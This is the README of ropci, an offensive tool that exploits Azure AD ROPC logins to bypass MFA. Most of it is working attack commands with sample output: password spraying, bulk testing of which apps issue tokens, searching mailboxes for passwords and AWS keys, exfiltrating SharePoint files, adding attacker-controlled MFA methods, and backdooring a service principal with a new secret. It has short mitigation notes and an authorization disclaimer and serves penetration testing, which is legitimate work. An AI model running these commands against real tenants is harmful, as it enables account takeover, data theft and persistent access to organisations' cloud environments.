This tool has helped identify MFA bypasses and then abuse APIs in multiple production AAD tenants, where AAD customers believed they had MFA enforced, but ROPC based authentication succeeded. 

![ropci](ropci.png)

The guidance is: **Always explicitly enforce MFA!** 

Sounds easy, but testing results show that real world setups are convoluted and at times provide MFA bypass opportunities.

# What is ROPC?

Resource Onwer Password Credentials (ROPC) allows to authenticate to OAuth2 apps via username and password. 

It is a deprecated auth flow that requires a high degree of trust between participants. Many built-in Microsoft Azure OAuth apps support ROPC and can be leveraged by attackers. 

Because it supports only single-factor username/password authentication, ROPC is an avenue to exploit MFA misconfigurations (such as lack of MFA enforcement). 

# Building ropci 

Grab a copy of the source and `go build`:

```
git clone https://github.com/wunderwuzzi23/ropci
go build -ldflags "-s -w -X 'ropci/cmd.VersionInfo=$(git rev-parse HEAD)'"  -o ropci main.go
```

That's it.

# Quick ROPC single-factor authentication test

To perform a quick ad-hoc test for an account run:

```
./ropci auth logon -t $YOUR_TENANT -u $YOUR_USER -P --discard-token
```

Where you set, or replace `$YOUR_TENANT` and `$YOUR_USER` with the account and tenant to test.

* `-P`: means to prompt for password, rather then reading from config file or command line.
* `--discard-token`: if authentication succeeds, the returned access token will not be stored.

If this succeeds it means that single-factor ROPC authentication succeeded. This is probably unwanted, as things get bad from here. You should reach out to an IT administrator to discuss ROPC and have this fixed.

# Using ropci

The leverage all the features of ropci, let's first configure it.

## Configuration

If you run `./ropci configure` you can persist auth information to a config file.

```
$ ./ropci configure
Let's set things up by entering Tenant, Username and Password.
Azure Tenant Name or ID (e.g. contoso.onmicrosoft.com): contoso.onmicrosoft.com
Username (e.g. bob@example.org): joe@example.org
Nearly done, let's enter the password.
You can leave the password blank if you don't want it stored, and specify the -P flag each time.
Password: 
Configuration complete.
```

The default config settings are stored in the `.ropci.yaml` file. The important settings are: tenant, username, password and clientid.


## Basic ropci usage

`ropci` has built-in help that describes various flags and features.

```
$ ./ropci
Resource Owner Password Credentials Assessment Tool for AAD.
ropci by wunderwuzzi23

Usage:
  ropci [flags]
  ropci [command]

Available Commands:
  apps        List all the apps/clientids (servicePrincipals) available in the tenant
  auth        Authenticate to AAD using ROPC
  azure       Interact with Azure Resource Manager
  call        Generic call method to invoke arbitrary APIs
  completion  Generate the autocompletion script for the specified shell
  configure   Initialize the ropci configuration to get started.
  drive       List, download or upload files to Sharepoint
  groups      List or create groups
  help        Help about any command
  mail        Access mail of the user
  search      Search through mail messages, chats or Sharepoint files
  users       List all users or an individual user's details

Flags:
  -a, --all               Retrieve all records, this could take a while
  -A, --azureuri string   Azure Resource Management Uri (default "https://management.azure.com")
      --config string     config file (default is ./.ropci.yaml)
      --format string     output results in table, csv or json (when applicable (default "table")
  -G, --graphuri string   graph endpoint/version to call when access Microsoft Graph API (default "https://graph.microsoft.com/beta")
  -h, --help              help for ropci
  -v, --verbose           Print more info
      --version           version for ropci

Use "ropci [command] --help" for more information about a command.
```

# Getting an Access Token

Then `./ropci auth logon` will get an access token for the user/password/client id specified in the `.ropci.yaml` file. 

```
$ ./ropci auth logon 
Succeeded. Token written to .token.
```

Its possible to provide a custom `client_id` by providing the `--clientid` argument - more about testing of specific apps later.

If authentication fails you will receive an error message, stating the AAD error that occured.

## Refreshing a Token

You can later also refresh a token by running `./ropci auth refresh`. This also allows you to import a refresh token from elsewhere via `./ropci auth refresh --refresh token {token}`.

## Device Code Support

To get an `access_token` via the devicecode flow you can leverage `./ropci auth deviceflow`.

This is useful if you want to play around with the other post-authentication features of ropci.

# Checking for MFA enforcement

The first offsec tests should revolve around evaluating if MFA is configured correcty (if at all). 

There are a couple of things to explore, including testing:
* **Your own user account**: Users hopefully have MFA enforced.
* **Service Accounts**: A common angle for MFA bypasses.
* **AAD only accounts**: Test for AAD only accounts (important, but not limited to federation scenarios where MFA is configured at the federated identity provider)

Let's take a look at this example:

```
$ ./ropci auth logon -u alice@wunderwuzzi.net -P
Password: 
Succeeded. Token written to .token.
```

* Use `-u` for testing different accounts (without having to update the configuration file).
* The `-P` argument means that the tool will prompt fo the password that way it's not on the command line.

That's the basic auth/testing mechanism.

# Password Spraying

ropci also comes with the ability to perform an ROPC based password spray.

```
./ropci auth spray --users-file users.list --passwords-file passwords.list -o result --wait 60 --wait-try 10 
Attempts: 12 for ClientID d3590ed6-52b3-4102-aeff-aad2292ab01c

Attempt 0001: alice@wunderwuzzi.net                     test1242355                     invalid username or password
Attempt 0002: tom@wunderwuzzi.net                       test123                         invalid username or password
Attempt 0003: doesnotexist@wunderwuzzi.net              test1242355                     account does not exist
Attempt 0004: tom@wunderwuzzi.net                       test1242355                     invalid username or password
Attempt 0005: tom@wunderwuzzi.net                       Sommer2022!                     invalid username or password
Attempt 0006: doesnotexist@wunderwuzzi.net              Sommer2022!                     account does not exist
Attempt 0007: alice@wunderwuzzi.net                     test                            invalid username or password
Attempt 0008: alice@wunderwuzzi.net                     test123                         invalid username or password
Attempt 0009: doesnotexist@wunderwuzzi.net              test123                         account does not exist
Attempt 0010: alice@wunderwuzzi.net                     Sommer2022!                     success
Attempt 0011: doesnotexist@wunderwuzzi.net              test                            account does not exist
Attempt 0012: tom@wunderwuzzi.net                       test                            invalid username or password
```

Be aware of any account lockout policies, and make sure you have proper authorization before engaging in such testing.


# Enumerating and evaluating apps

In case you got an access token it is  a good idea to enumerate all the OAuth apps that are registered for a tenant.

## Reading all the registered apps (clientids) of the tenant 

To enumerate all OAuth2 apps (so called servicePrincipals in AAD) use `./ropci apps list`:

```
$ ./ropci apps list
+----------------------------------------------------------------+--------------------------------------+--------------------+
|                          displayName                           |                appId                 |   publisherName    |
+----------------------------------------------------------------+--------------------------------------+--------------------+
| Microsoft Teams Mailhook                                       | 51133ff5-8e0d-4078-bcca-84fb7f905b64 | Microsoft Services |
| OCaaS Client Interaction Service                               | c2ada927-a9e2-4564-aae2-70775a2fa0af | Microsoft Services |
| Microsoft Office Licensing Service vNext                       | db55028d-e5ba-420f-816a-d18c861aefdf | Microsoft Services |
| Messaging Bot API Application                                  | 5a807f24-c9de-44ee-a3a7-329e88a00ffc | Microsoft Services |
| Service Encryption                                             | dbc36ae1-c097-4df9-8d94-343c3d091a76 | Microsoft Services |
| Microsoft Mobile Application Management Backend                | 354b5b6d-abd6-4736-9f51-1be80049b91f | Microsoft Services |
| Microsoft Graph                                                | 00000003-0000-0000-c000-000000000000 | Microsoft Services |
| Permission Service O365                                        | 6d32b7f8-782e-43e0-ac47-aaad9f4eb839 | Microsoft Services |
| SubscriptionRP                                                 | e3335adb-5ca0-40dc-b8d3-bedc094e523b | Microsoft Services |
.....
```

There are likely more then 100 apps in your tenant. `ropci` will only show you 100 entries by default. Use the `--all` argument when calling the command to list everything, you can also output all the details as `json`. 

```
./ropci apps list --all --format json -o apps.json
```


## Perform a bulk authentication validation 

Use the following command to get a csv file that can be used with the `./ropci auth bulk` command:

```
./ropci apps list --all --format json | jq -r '.value[] | [.displayName,.appId] | @csv' > apps.csv
```

This will create a csv file that can be used with the `auth bulk` command.

## Bulk ROPC validation of all apps 

The command for this is `./ropci auth bulk -i apps.csv -o output.json`. 

Here is an example:

```
$ ./ropci auth bulk -i apps.csv -o results.json
ClientIDs from CSV file apps.csv.
Results will be written to results.json.

Issuing Requests...~420
Waiting for results...
+------------------------------------------+--------------------------------------+---------+-----------------------------------+
|               displayName                |                appId                 | result  |               scope               |
+------------------------------------------+--------------------------------------+---------+-----------------------------------+
| Microsoft Teams ATP Service              | 0fa37baf-7afc-4baf-ab2d-d5bb891d53ef | error   |                                   |
| Microsoft Dynamics CRM                   | 2db8cb1d-fb6c-450b-ab09-49b6ae35186b | error   |                                   |
| Microsoft Outlook                        | 5d661950-3475-41cd-a2c3-d671a3162bc1 | success | email openid profile              |
|                                          |                                      |         | AuditLog.Create Chat.Read         |
|                                          |                                      |         | DataLossPreventionPolicy.Evaluate |
|                                          |                                      |         | Directory.Read.All                |
|                                          |                                      |         | EduRoster.ReadBasic               |
|                                          |                                      |         | Files.ReadWrite.All               |
|                                          |                                      |         | Group.ReadWrite.All               |
|                                          |                                      |         | InformationProtectionPolicy.Read  |
|                                          |                                      |         | OnlineMeetings.Read People.Read   |
|                                          |                                      |         | SensitiveInfoType.Detect          |
|                                          |                                      |         | SensitiveInfoType.Read.All        |
|                                          |                                      |         | SensitivityLabel.Evaluate         |
|                                          |                                      |         | User.Invite.All User.Read         |
|                                          |                                      |         | User.ReadBasic.All                |
| Service                                  |                                      |         |                                   |
| PushChannel                              | 4747d38e-36c5-4bc3-979b-b0ef74df54d1 | error   |                                   |
| Microsoft.MileIQ                         | a25dbca8-4e60-48e5-80a2-0664fdb5c9b6 | success | profile openid email              |
|                                          |                                      |         | user_impersonation                |
| Storage Resource Provider                | a6aa9161-5291-40bb-8c5c-923b567bee3b | error   |                                   |
| M365 Admin Services                      | 6b91db1b-f05b-405a-a0b2-e3f60b28d645 | error   |                                   |
| Microsoft Teams                          | 1fec8e78-bce4-4aaf-ab1b-5451cc387264 | success | email openid profile              |
|                                          |                                      |         | Channel.ReadBasic.All             |
|                                          |                                      |         | Contacts.ReadWrite.Shared         |
|                                          |                                      |         | Files.ReadWrite.All               |
|                                          |                                      |         | InformationProtectionPolicy.Read  |
|                                          |                                      |         | MailboxSettings.ReadWrite         |
|                                          |                                      |         | Notes.ReadWrite.All               |
|                                          |                                      |         | People.Read Place.Read.All        |
|                                          |                                      |         | Sites.ReadWrite.All               |
|                                          |                                      |         | Tasks.ReadWrite                   |
|                                          |                                      |         | User.ReadBasic.All                |
| Power BI Service                         | 00000009-0000-0000-c000-000000000000 | error   |                                   |
...
+------------------------------------------+--------------------------------------+---------+-----------------------------------+

Done. 
You could now run the following command to analyze valid tokens and there scopes:
$ cat results.json | jq -r 'select (.access_token!="") | [.display_name,.scope] | @csv'
Happy Hacking.
```

This gives you an idea which applications support ROPC and what permissions they have that an adversary could abuse. 
The result file will already contain the retrieved `access_tokens` from each app.

It's also a good list for the IT admins and blue team to monitor and lock down.

# Gathering data

There are a set of well-known Microsoft ROPC capable apps that allow to:
* Users and Group memberships (`./ropci users` and `./ropci groups`)
* Reading and sending email for the compromised account (`./ropci mail` and `./ropci mail send`)
* Reading and uploading files to SharePoint/OneDrive (`./ropci drive`)
* Using the search API to find secrets and other information ( `./ropci search`)

The use the API's succesfully an appropriate access token has to be stored in the `.token` file. 

In order to switch to a different `clientid` the following command can be used `./ropc auth logon --clientid 57336123-6e14-4acc-8dcf-287b6088aa28`.


Using the other commands, such as `./ropci mail` it's possible to read or even send email. Using `./ropci drive` its possible to exfiltrate or upload data from/to SharePoint. There is also a `./ropci search` features that can be used to search an account's mailbox for interesting terms.


# Powerful Microsoft Apps

All the apps and there permission are in the checked csv file, but for regular tests the following three should suffice.:

```
57336123-6e14-4acc-8dcf-287b6088aa28 - Microsoft Whiteboard Client	
email openid profile Calendars.Read Channel.ReadBasic.All ChannelMessage.Send Contacts.Read Directory.Read.All EduRoster.ReadBasic Files.ReadWrite.All Group.Read.All Mail.ReadWrite Mail.Send Notes.Create Notes.Read Notes.ReadWrite People.Read User.Read User.Read.All User.ReadBasic.All

00b41c95-dab0-4487-9791-b9d2c32c80f2 - Office 365 Management	
email openid profile Contacts.Read Contacts.ReadWrite Directory.AccessAsUser.All Mail.ReadWrite Mail.ReadWrite.All People.Read People.ReadWrite Tasks.ReadWrite User.ReadWrite User.ReadWrite.All

d3590ed6-52b3-4102-aeff-aad2292ab01c - Microsoft Office
email openid profile AuditLog.Read.All Calendar.ReadWrite Calendars.Read.Shared Calendars.ReadWrite Contacts.ReadWrite DataLossPreventionPolicy.Evaluate DeviceManagementConfiguration.Read.All DeviceManagementConfiguration.ReadWrite.All Directory.AccessAsUser.All Directory.Read.All Files.Read Files.Read.All Files.ReadWrite.All Group.Read.All Group.ReadWrite.All InformationProtectionPolicy.Read Mail.ReadWrite Notes.Create People.Read People.Read.All SensitiveInfoType.Detect SensitiveInfoType.Read.All SensitivityLabel.Evaluate Tasks.ReadWrite TeamMember.ReadWrite.All User.Read.All User.ReadBasic.All User.ReadWrite Users.Read
```

# Detections and Mitigations

A couple of items to dive into and cross-check:

* Is MFA enforced for all accounts?
* What exceptions exist? What about service accounts or AAD only accouts? :) 
* SSO. Is MFA handled by another identity provider? This might could leave tenant vulnerable to ROPC attacks.
* Review custom applications that are present in your tenant. Do they support ROPC? Can anyone use them? Lock them down.
* Review Sign-In logs for single-factor authentication requests and ROPC

# Key take-aways 

Here is a quick recap and testing and mitigation recommendations:

* **Always explicitly enforce MFA!** This sounds easy, but apparently it seems to be a challenge to implement given the amount and kind of bypasses I have seen with production AAD tenants.
* If you paid for Azure Premium, leverage Conditional Access Policies to enforce MFA.
* Security defaults might not adequately protect user accounts. 
In some of my testing I switched IP address multiple times to various countries (impossible travel) and ROPC authentication continued to succeed. It’s best to enforce MFA for all accounts, rather then depending on security defaults to make the right decisions.
* Hybrid and federated MFA enforcement can leave "native" AAD accounts vulnerable.
* If you block legacy auth via policy, make sure to include "mobile apps and desktop clients" (the default template currently doesn't include it)
* Some scenarios might remain vulnerable to single factor authentication. **The exposure should be known, and a conscious decision (risk acceptance)**
* Know your weaknesses, monitor exposure, and continue locking down settings.
* **Test and validate your configurations from an offensive security point of view!**


# Other useful commands and features

## Basic info about a user 

Show some interesting info about a user (by default logged on user is used):

```
./ropci users who [-u joe@example.org]

```

## Search the users mail messages

By default the following searches for the word `password`:

```
./ropci search
```

But you can specify a custom query with `-q`. Here is an example:

```
 ./ropci search -q 'AWS_ACCESS' -f rank -f summary
+------+-----------------------------------------------------------------------------------------------------------------------------------------------------------+
| rank |                                                        summary                                                                                            |
+------+-----------------------------------------------------------------------------------------------------------------------------------------------------------+
|    1 | ...is not known. <c0>AWS_ACCESS</c0>_KEY_ID=AKIAsomethingsomething AWS_SECRET_ACCESS_KEY=this_is_a_secret This grants you access to the EC2 instance and 
you can create s3 data. Greetings,Security.                                                                                                                        |
+------+-----------------------------------------------------------------------------------------------------------------------------------------------------------+

Number of items: 1
```

Pretty neat. 

You can also search for other items, like Sharepoint listItems, etc.. by specifying `-t` and the type.

## List all groups

```
./ropci groups list --format json -o groups.json
cat groups.json | jq -r '.value[].id'
#./ropci groups member-list -g 

```

## List members and owners of a group 

```
./ropci call -c /users/bob@wunderwuzzi.net/ownedObjects
./ropci call -c '/me/getMemberGroups' -b '{"securityEnabledOnly": false }' --verb POST
```


## Search for users/groups:

```
./ropci users list -s userPrincipalName:bob
```


## Upload a file to SharePoint

Uploading a file to SharePoint drive:

```
./ropci drive upload -p "/Tom @ ExampleOrg, LLC/testing.txt" -d ./ropci -v
```


## Read mail in text form 

The following command will show some basic info about the accounts inbox:
```
./ropci mail list
```

Read mail body.content in text form:

```
 ./ropci mail list --format json | jq .value[].body.content
```

## Add an owner to a group 

List or add an owner of a group:

```
./ropci groups owner-list -g 68af7cb2-551f-4d99-9959-a1bede7ac1e0
./ropci groups owner-add -u 0df463da-1a1c-4dba-817d-ca72438524ce -g 68af7cb2-551f-4d99-9959-a1bede7ac1e0
```



## Invalidate Refresh Tokens

This is quite important in order to protect yourself:

```
./ropci auth invalidate
```

Which basically calls `/me/invalidateAllRefreshTokens`:

```
./ropci call -c /me/invalidateAllRefreshTokens --verb POST
```

If you try to refresh now with `./ropci auth refresh` the following error will be shown:

```
AADSTS50173: The provided grant has expired due to it being revoked, a fresh auth token is needed. The user might have changed or reset their password. The grant was issued on '2022-09-05T18:48:10.7367392Z' and the TokensValidFrom date (before which tokens are not valid) for this user is '2022-09-05T18:48:54.0000000Z'
```

Refresh tokens have been invalidated for the logged on user. If the account has the right permissions one can also call `/users/username@expample.org/invalidateAllRefreshTokens` to invalidate refresh tokens of another account.

## Application Role Assignments of a user

[Graph API Documentatin](https://docs.microsoft.com/en-us/graph/api/user-list-approleassignments?view=graph-rest-beta&tabs=http)

```
./ropci call -c /users/user@example.org/appRoleAssignments -f id -f principalDisplayName -f resourceDisplayName -f resourceId
+---------------------------------------------+----------------------+-------------------------+--------------------------------------+
|                     id                      | principalDisplayName |   resourceDisplayName   |              resourceId              |
+---------------------------------------------+----------------------+-------------------------+--------------------------------------+
| 5c6Mg23JVUWFS5E9XaB_vQObgianBrBMugogPRfMvYU | Vera Mitchell        | Apple Internet Accounts | 36559af8-a122-4101-b6c7-adccfa24506d |
| 5c6Mg23JVUWFS5E9XaB_vUG-XjOYoexCm4D9r2fYwxI | Vera Mitchell        | Graph Explorer          | f3ff1808-52d0-4516-b090-28a06cd24783 |
| 5c6Mg23JVUWFS5E9XaB_vaBGH-RIpJRMuE0qYZ7s5ZE | Vera Mitchell        | AppForHealthServices    | 48359af7-af3a-42d4-abe2-8425a14689c9 |
+---------------------------------------------+----------------------+-------------------------+--------------------------------------+
```

## Backdooring a Service Principal (adding additional password)

```
$ ./ropci call -c /servicePrincipals/48359af7-af3a-42d4-abe2-8425a14689c9/addPassword \ 
--verb POST  -b '{"passwordCredential": { "displayName": "ropci says this is fine"}} | jq

{
  "@odata.context": "https://graph.microsoft.com/beta/$metadata#servicePrincipals('48359af7-af3a-42d4-abe2-8425a14689c9')/addPassword",
  "@odata.type": "#microsoft.graph.servicePrincipal",
  "customKeyIdentifier": null,
  "endDateTime": "2024-09-05T19:48:11.1638864Z",
  "keyId": "c47e91ff-986c-4f8f-9cc0-d41bdd038d49",
  "startDateTime": "2022-09-05T19:48:11.1638864Z",
  "secretText": "Yhj8Q~H1np.....4iEGuf0djD",
  "hint": "Yhj",
  "displayName": "ropci says this is fine"
}
```

Take note of the response, and the `secretText`. This is what can be used to impersonate the service principal.

With that `secretText`, which is the `client_secret` you can get an access token via the OAuth2 `client_credential` flow:

```
curl -d 'grant_type=client_credentials&client_id=2581d8b8-2e9c-4374-a418-06f9cfed87ff&client_secret=Yhj8Q~H1np.....4iEGuf0djD&scope=https://graph.microsoft.com/.default' https://login.microsoftonline.com/wuzzi.onmicrosoft.com/oauth2/v2.0/token
```

Fun times!

## More useful recon commands

### Chats

```
./ropci call -c /me/chats
```

### Searching for other items (e.g person)

```
./ropci search -t person -q "ropci" --format json  | jq
```

## Others

The `call` command allows to invoke the many other APIs that are exposed. Here are a couple of interesting examples:

```
./ropci call -c /domains --format json -o domains.json
./ropci call -c /domains/{tenant}}/verificationDnsRecords --format json -o verificationDnsRecords-domain1.json
./ropci call -c /organization --format json -o organization.json
./ropci call -c /identity/conditionalAccess/policies --format json -o conditionalAccess-Policies.json

```

```
./ropci call -c '/identity/b2cUserFlows/B2C_test_signin_signup/userflowIdentityProviders'
```

## Explore authentication methods

```
./ropci auth logon --clientid 27922004-5251-4030-b22d-91ecd9a37ea4 # Use Outlook Mobile clientID
./ropci call -c '/me/authentication/methods' -f id -f  emailAddress --format json | jq

./ropci call -c '/me/authentication/phoneMethods' -f id -f phoneNumber -f phoneType
./ropci call -c '/me/authentication/emailMethods' -f id -f emailAddress

./ropci call -c '/me/authentication/phoneMethods' --verb POST -b '{"phoneNumber": "+1 5558008000","phoneType": "mobile"}'
./ropci call -c '/me/authentication/emailMethods' --verb POST -b '{"emailAddress": "joe@example.org"}'
```

## List deleted users or other deleted items

When an object (e.g. user account) is deleted, it's not entirely deleted right away. It's possible to restore them within 30 days.
The following command lists the delete users:

```
./ropci call -c /directory/deletedItems/microsoft.graph.user
+--------------------------------------+-------------+------+
|                  id                  | displayName | name |
+--------------------------------------+-------------+------+
| e94d329b-ec6a-41fa-923c-fcd0eab5b12e | John Ropci  |      |
| ea9f55dc-f38b-4344-8731-a97454778094 | Ropci       |      |
+--------------------------------------+-------------+------+
```

There is a lot more to explore. Hope this was helpful.

Cheers!

# Disclaimer

Pentesting and security assessments require authorization from proper stakeholders. Do not do anything illegal.

# Cross-compiling

If you are on Linux, and want to comple Windows or macOS versions you can use:

```
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w -X 'ropci/cmd.VersionInfo=$(git rev-parse HEAD)'" -o ropci.exe main.go 
GOOS=darwin GOARCH=amd64 go build -ldflags "-s -w -X 'ropci/cmd.VersionInfo=$(git rev-parse HEAD)'" -o ropci main.go 
```

# References, related tooling and further reading material:

* AADInternals by @DrAzureAD: https://o365blog.com/aadinternals
* Abusing Family Refresh Tokens by SecureWorks: 
https://github.com/secureworks/family-of-client-ids-research
* Other interesting tooling: ROADTools, TeamFiltration,...
* Microsoft Graph API: https://learn.microsoft.com/en-us/graph/
* OAuth RFC: https://www.rfc-editor.org/rfc/rfc6749.html
* OAuth 2.0 Security Best Current Practice: 
https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#page-9
* ROPC docs: https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth-ropc
* Hackers are using this sneaky exploit to bypass Microsoft's MFA: https://www.zdnet.com/article/hackers-are-using-this-sneaky-trick-to-exploit-dormant-microsoft-cloud-accounts-and-bypass-multi-factor-authentication/

